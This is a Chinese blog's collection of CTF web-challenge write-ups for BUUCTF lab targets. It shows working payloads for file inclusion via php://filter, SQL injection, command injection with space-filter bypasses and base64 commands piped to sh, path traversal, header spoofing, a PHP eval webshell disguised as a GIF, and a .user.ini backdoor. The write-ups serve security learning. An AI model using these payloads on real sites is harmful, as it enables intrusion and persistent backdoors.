<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF WP合集</title>
    <url>/2021/03/02/buuctfwp/</url>
    <content><![CDATA[<p>此为个人的解题记录，为记录方便，尽量不截图，不复述原题，随时更新。</p>
<a id="more"></a>

<h2 id="ACTF"><a href="#ACTF" class="headerlink" title="[ACTF]"></a>[ACTF]</h2><h3 id="2020-新生赛-include"><a href="#2020-新生赛-include" class="headerlink" title="2020 新生赛 include"></a>2020 新生赛 include</h3><p>文件包含，利用伪协议base64编码来读取文件源码，得到被注释的flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>







<hr>
<h2 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="[BJDCTF]"></a>[BJDCTF]</h2><h3 id="2020-Easy-MD5"><a href="#2020-Easy-MD5" class="headerlink" title="2020 Easy MD5"></a>2020 Easy MD5</h3><p>涉及到一个知识点：</p>
<p> <code>ffifdyop</code> 这个字符串被 md5 哈希了之后会变成 <code>276f722736c95d99e921722cf9ed621c</code>，这个字符串前几位刚好是<code>‘ or ‘6</code>，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是<code>1 select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p>
<p>该题GET <code>password=ffifdyop</code>，得到新页面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>与<code>strcmp()</code>函数原理相同，由于md5函数不能处理数组，导致函数返回Null，两个空值相等。</p>
<p>所以GET<code>a[]=1&amp;b[]=2</code>，得到新页面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>同理，换成POST就好。</p>
<p>还有一个巧妙的绕过方法，可以找出md5值都是两个<code>0e</code>开头的，php里面在做 <code>==</code> 的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学技计数法，而0的多少次方都是0。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这样的值有：</span><br><span class="line">QNKCDZO</span><br><span class="line">s155964671a</span><br><span class="line">s1091221200a</span><br></pre></td></tr></table></figure>







<hr>
<h2 id="GXYCTF"><a href="#GXYCTF" class="headerlink" title="[GXYCTF]"></a>[GXYCTF]</h2><h3 id="2019-Ping-Ping-Ping"><a href="#2019-Ping-Ping-Ping" class="headerlink" title="2019 Ping Ping Ping"></a>2019 Ping Ping Ping</h3><p>这道题进来只有一个ping命令，输入ip地址正常request。</p>
<p>后面加个ls，得到有<code>flag.php</code>和<code>index.php</code>两个文件。</p>
<blockquote>
<p>Linux ls（英文全拼：list files）命令用于显示指定工作目录下之内容（列出目前工作目录所含之文件及子目录)。</p>
</blockquote>
<p>用cat flag.php显示空格被过滤。</p>
<p>绕过空格的常用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;cat,flag.php&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.php</span><br><span class="line">cat$IFS$9flag.php </span><br><span class="line">cat&lt;flag.php</span><br><span class="line">cat&lt;&gt;flag.php</span><br><span class="line">kg&#x3D;$&#39;\x20flag.php&#39;&amp;&amp;cat$kg</span><br><span class="line">a&#x3D;c;b&#x3D;at;c&#x3D;flag.php;$a$b $c</span><br><span class="line">b&#x3D;ag;a&#x3D;fl;cat$IFS$1$a$b.php</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br><span class="line">echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</span><br></pre></td></tr></table></figure>

<p>要是禁用cat的话可以用less、more、tac、ca\t等绕过。</p>
<p>试了几个，发现flag也被过滤，成功用<code>cat$IFS$9index.php</code>看到了源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\/?ip=|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>考虑如何来绕过flag，得到以下payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;<span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh</span><br><span class="line"><span class="comment">//Y2F0IGZsYWcucGhw是cat flag.php的base64-encode</span></span><br><span class="line"><span class="comment">//base64 -d 就是base64-encode</span></span><br><span class="line"><span class="comment">// |sh就是用sh执行</span></span><br></pre></td></tr></table></figure>

<p>找flag文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1;find &#x2F; -name flag</span><br><span class="line">127.0.0.1;ls ..&#x2F;..&#x2F;..&#x2F;</span><br></pre></td></tr></table></figure>



<h3 id="2020-BackupFile"><a href="#2020-BackupFile" class="headerlink" title="2020 BackupFile"></a>2020 BackupFile</h3><p>备份，<code>index.php.bak</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉。</p>
<hr>
<h2 id="HCTF"><a href="#HCTF" class="headerlink" title="[HCTF]"></a>[HCTF]</h2><h3 id="2018-WarmUp"><a href="#2018-WarmUp" class="headerlink" title="2018 WarmUp"></a>2018 WarmUp</h3><p>本题主要在绕过几个if检查。</p>
<p>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true</p>
<p>第四个if语句判断先url解码再截取的$page是否存在于$whitelist中，存在则返回true</p>
<p>所以我们要构造payload来使url解码后仍然是 <code>?</code> 即<code>%253f</code>。</p>
<p>由于不知道flag文件位置，使用相对路径一个一个尝试，最终得到payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;fa11c443-afb7-4ce7-9b4d-b4d3266118ee.node3.buuoj.cn&#x2F;?file&#x3D;source.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>



<h3 id="2018-admin"><a href="#2018-admin" class="headerlink" title="2018 admin"></a>2018 admin</h3><blockquote>
<p>reference：<a href="https://www.cnblogs.com/chrysanthemum/p/11722351.html">https://www.cnblogs.com/chrysanthemum/p/11722351.html</a></p>
<p>reference：<a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">https://blog.csdn.net/weixin_44677409/article/details/100733581</a></p>
</blockquote>
<p>参考上面资料，使用unicode欺骗来获得admin登录权限。</p>
<p>用下面的网站找到admin：<code>ᴬᴰᴹᴵᴺ</code>，由于该题会将所有结果进行<code>strtolower()</code>来转换成小写，在这样之后<code>ᴬᴰᴹᴵᴺ</code>就会变成<code>admin</code>，从而成功登录。</p>
<blockquote>
<p><a href="https://unicode-table.com/en/1D2E/">https://unicode-table.com/en/1D2E/</a></p>
</blockquote>
<p>好像预期解是flask session伪造。</p>
<hr>
<h2 id="极客大挑战"><a href="#极客大挑战" class="headerlink" title="[极客大挑战]"></a>[极客大挑战]</h2><h3 id="2019-Http"><a href="#2019-Http" class="headerlink" title="2019 Http"></a>2019 Http</h3><p>http请求 headers 中的配置：</p>
<table>
<thead>
<tr>
<th align="center">headers</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Accept</td>
<td align="center">指定客户端能够接收的内容类型，内容类型中的先后次序表示客户端接收的先后次序。</td>
</tr>
<tr>
<td align="center">Accept-Language</td>
<td align="center">指定HTTP客户端浏览器用来展示返回信息所优先选择的语言。</td>
</tr>
<tr>
<td align="center">Accept-Encoding</td>
<td align="center">指定客户端浏览器所能够支持的返回压缩格式。</td>
</tr>
<tr>
<td align="center">Connection</td>
<td align="center">表示是否需要持久连接。如果web服务器端看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以减少下载所需要的时间。</td>
</tr>
<tr>
<td align="center">Cookie</td>
<td align="center">HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
</tr>
<tr>
<td align="center">Host</td>
<td align="center">请求的web服务器域名地址。</td>
</tr>
<tr>
<td align="center">Referer</td>
<td align="center">包含一个URL，用户从该URL代表的页面出发访问当前请求的页面服务器端返回HTTP头部信息。</td>
</tr>
<tr>
<td align="center">User-Agent</td>
<td align="center">HTTP客户端运行的浏览器类型的详细信息。通过该头部信息，web服务器可以判断到当前HTTP请求的客户端浏览器类别。</td>
</tr>
</tbody></table>
<p>页面中发现了<code>secret.php</code>，访问后显示<code>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;.</code></p>
<p>所以我们利用python，添加headers来满足要求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;node3.buuoj.cn:25212&#x2F;Secret.php&#39;</span><br><span class="line">headers&#x3D;&#123;&quot;Referer&quot;:&quot;https:&#x2F;&#x2F;www.Sycsecret.com&quot;,&quot;Origin&quot;:&quot;https:&#x2F;&#x2F;www.Sycsecret.com&quot;&#125;</span><br><span class="line">r &#x3D; requests.get(url,headers&#x3D;headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>得到信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Please use &quot;Syclover&quot; browser</span><br></pre></td></tr></table></figure>

<p>添加headers：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">headers[&#39;User-Agent&#39;] &#x3D; &quot;Syclover&quot;</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">No!!! you can only read this locally!!</span><br></pre></td></tr></table></figure>

<p>伪造本地ip：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">headers[&#39;X-Forwarded-For&#39;] &#x3D; &#39;127.0.0.1&#39;</span><br></pre></td></tr></table></figure>

<p>得到flag。</p>
<h3 id="2019PHP"><a href="#2019PHP" class="headerlink" title="2019PHP"></a>2019PHP</h3><p>私有类还要用python执行才行。</p>
<p>序列化：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;username = <span class="string">&quot;guests&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = serialize(<span class="keyword">new</span> Name(<span class="string">&quot;admin&quot;</span>,<span class="number">100</span>));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="2019-Upload"><a href="#2019-Upload" class="headerlink" title="2019 Upload"></a>2019 Upload</h3><blockquote>
<p>reference：<a href="https://www.cnblogs.com/yunqian2017/p/13308641.html">https://www.cnblogs.com/yunqian2017/p/13308641.html</a></p>
</blockquote>
<p>首先尝试上传，发现限制了文件的后缀名，没法上传<code>.php</code> <code>.php3</code> <code>.php5</code>等php文件，但是这里没有过滤<code>.phtml</code>，这是一个可以用html语法来实现php命令的后缀文件。</p>
<p>文件内容如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_REQUEST[test])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传会显示<code>It&#39;s not a image at all!</code>，那就在前面加个文件头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GITF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_REQUEST[test])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>把<code>content-type</code>修改为<code>image/jpg</code>。</p>
<p>离谱的地方在于要盲猜文件保存路径来连接蚁剑，这里是<code>/upload/1.phtml</code>。</p>
<h3 id="2019-buyflag"><a href="#2019-buyflag" class="headerlink" title="2019 buyflag"></a>2019 buyflag</h3><p>抓包修改<code>user=1</code>；</p>
<p>POST <code>password=404a</code>（弱比较）</p>
<p>POST <code>money=100000000</code>，显示太长了</p>
<p>科学计数法 <code>money=1e9</code>，拿到flag</p>
<p>或者绕过<code>strcmp()</code>函数，只要我们POST的是一个数组或object：<code>money[]=100000000</code>，即可绕过验证。</p>
<hr>
<h2 id="强网杯"><a href="#强网杯" class="headerlink" title="[强网杯]"></a>[强网杯]</h2><h3 id="2019-随便注"><a href="#2019-随便注" class="headerlink" title="2019 随便注"></a>2019 随便注</h3><blockquote>
<p>reference：<a href="https://www.cnblogs.com/joker-vip/p/12483823.html">https://www.cnblogs.com/joker-vip/p/12483823.html</a></p>
</blockquote>
<hr>
<h2 id="RoarCTF"><a href="#RoarCTF" class="headerlink" title="[RoarCTF ]"></a>[RoarCTF ]</h2><h3 id="2019-Easy-Calc"><a href="#2019-Easy-Calc" class="headerlink" title="2019 Easy Calc"></a>2019 Easy Calc</h3><p>进来是一个计算页面，输入字母会显示错误。源码中找到如下提示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$(&#x27;#calc&#x27;).submit(function()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br><span class="line">        type:&#x27;GET&#x27;,</span><br><span class="line">        success:function(data)&#123;</span><br><span class="line">            $(&quot;#result&quot;).html(`<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-success&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">strong</span>&gt;</span>答案:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>$&#123;data&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`);</span><br><span class="line">        &#125;,</span><br><span class="line">        error:function()&#123;</span><br><span class="line">            alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    return false;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>而查阅得知php字符串的解析特性：</p>
<blockquote>
<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
</blockquote>
<p>所以我们构造url：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:28751&#x2F;calc.php? num&#x3D;phpinfo()</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:28751&#x2F;calc.php? num&#x3D;var_dump(scandir(chr(47)))</span><br><span class="line">&#x2F;&#x2F;scandir()函数	返回指定目录中的文件和目录的数组。</span><br><span class="line">&#x2F;&#x2F;var_dump()函数	显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</span><br><span class="line">&#x2F;&#x2F;由于题目将&#39;&#x2F;&#39;过滤了，所以我们用ascii码chr(47)来代替。</span><br></pre></td></tr></table></figure>

<p>查询到f1agg文件。然后构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:28751&#x2F;calc.php? num&#x3D;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br><span class="line">&#x2F;&#x2F;file_get_contents() 把整个文件读入一个字符串中。</span><br></pre></td></tr></table></figure>







<hr>
<h2 id="SUCTF"><a href="#SUCTF" class="headerlink" title="[SUCTF]"></a>[SUCTF]</h2><h3 id="2019-EasySQL"><a href="#2019-EasySQL" class="headerlink" title="2019 EasySQL"></a>2019 EasySQL</h3><p>扫描可得源码，堆叠注入得知flag表。</p>
<blockquote>
<p>reference：<a href="https://blog.csdn.net/qq_43678005/article/details/108101904">https://blog.csdn.net/qq_43678005/article/details/108101904</a></p>
</blockquote>
<p>因此构造payload：<code>*,1</code> 。</p>
<p>或者通过堆叠注入，设置 <code>sql_mode</code> 的值为 <code>PIPES_AS_CONCAT</code>，从而将 || 视为字符串的连接操作符而非或运算符,所以构造出来的payload为：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
<h3 id="2019-checkin"><a href="#2019-checkin" class="headerlink" title="2019 checkin"></a>2019 checkin</h3><p>该题为文件上传，这道题的重点在于，要利用<code>.user.ini</code>来使图片格式的文件被php解析。</p>
<blockquote>
<p>reference：<a href="https://www.cnblogs.com/wkzb/p/12286324.html">https://www.cnblogs.com/wkzb/p/12286324.html</a></p>
<p>什么是.user.ini？</p>
<p>先从php.ini说起，php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。</p>
<p>模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，和.user.ini中设置。这里就提到了.user.ini，那么这是个什么配置文件？</p>
<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
<p>​    所以可以理解为：.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。</p>
<p>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p>
<p>然后我们看到php.ini中的配置项，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。不过，我们仍然可以很容易地借助.user.ini文件来构造一个“后门”。</p>
<p>php配置项中auto_prepend_file具体意思是：指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而配置项中auto_append_file也类似，只是在文件后面包含。</p>
<p>使用方法很简单，直接写在.user.ini中：</p>
<p>auto_prepend_file=01.gif</p>
<p>01.gif是要包含的文件。所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p>
<p>哪些情况下可以用到这个姿势？</p>
<p>比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
</blockquote>
<p>在这道题中，我们先上传一个<code>.user.ini</code>文件，内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;01.gif</span><br></pre></td></tr></table></figure>

<p>然后再上传木马：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;system(&#39;cat &#x2F;flag&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>这里也可以是一句话木马，连蚁剑。由于该题在上传含有？的文件是会提示不允许含<code>？</code>，所以我们用script来绕过了一下。</p>
<p>访问文件地址拿到flag。</p>
<hr>
<h2 id="ZJCTF"><a href="#ZJCTF" class="headerlink" title="[ZJCTF]"></a>[ZJCTF]</h2><h3 id="2019-NiZhuanSiWei"><a href="#2019-NiZhuanSiWei" class="headerlink" title="2019 NiZhuanSiWei"></a>2019 NiZhuanSiWei</h3><p>主要是伪协议和反序列化。</p>
<blockquote>
<p>reference：<a href="https://jiulin.space/2021/01/02/php3/">https://jiulin.space/2021/01/02/php3/</a></p>
</blockquote>
<p>题目：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><code>file_get_contents</code>是读取文件中的字符串 ，不能直接GET，一般这种情况下，就要利用到<code>data</code>伪协议来写入文件。可能有过滤，就直接base64编码了。payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>

<p>后面这里不能直接读取flag，提示给了<code>uselesss.php</code>，利用<code>php</code>伪协议中的<code>php://filter</code>来读取文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>

<p>得到如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里就简单了，反序列化直接把file属性值设为<code>flag.php</code>：</p>
